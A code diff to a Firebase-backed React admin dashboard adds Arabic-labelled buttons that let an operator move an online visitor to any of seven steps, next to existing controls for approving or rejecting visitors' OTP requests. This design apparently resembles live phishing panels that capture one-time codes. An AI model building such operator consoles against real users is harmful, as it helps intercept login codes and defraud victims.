@@ -45,6 +45,7 @@ import {
   approveOtp,
   rejectOtp,
   deleteOtpRequest,
+  setUserStep,
   app
 } from "@/lib/firebase";
 import { getAuth, onAuthStateChanged, signOut, User as FirebaseUser } from "firebase/auth";
@@ -429,6 +430,10 @@ export default function FirebaseDashboard() {
     await rejectOtp(visitorId);
     // Delay deletion to allow client to receive rejection status
     setTimeout(() => deleteOtpRequest(visitorId), 3000);
+  };
+
+  const handleSetUserStep = async (visitorId: string, step: number) => {
+    await setUserStep(visitorId, step);
   };
 
   if (checkingAuth) {
@@ -898,6 +903,33 @@ export default function FirebaseDashboard() {
                     </span>
                   ))}
                 </div>
+
+                {/* Admin Step Control */}
+                {isUserOnline(selectedSubmission.visitorId) && (
+                  <div className={cn("mt-4 pt-4 border-t", currentTheme.border)}>
+                    <p className="text-xs text-orange-400 mb-2 flex items-center gap-1">
+                      <Settings className="h-3 w-3" />
+                      تحكم في خطوات المستخدم
+                    </p>
+                    <div className="flex flex-wrap gap-2">
+                      {[1, 2, 3, 4, 5, 6, 7].map((step) => (
+                        <Button
+                          key={step}
+                          size="sm"
+                          variant="outline"
+                          onClick={() => handleSetUserStep(selectedSubmission.visitorId, step)}
+                          className={cn(
+                            "text-xs px-3",
+                            currentTheme.border,
+                            "hover:bg-orange-500/20 hover:text-orange-400 hover:border-orange-500"
+                          )}
+                        >
+                          خطوة {step}
+                        </Button>
+                      ))}
+                    </div>
+                  </div>
+                )}
               </div>
 
               {/* Step 1: Account Type */}
